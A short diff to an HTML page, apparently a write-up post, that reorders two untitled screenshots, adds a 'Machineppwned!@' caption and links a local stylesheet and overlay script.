-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_26.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_27.png" alt="Untitled" />
+<p><br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_26.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_27.png" alt="Untitled" />
+<br /><br />
+Machineppwned!@
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
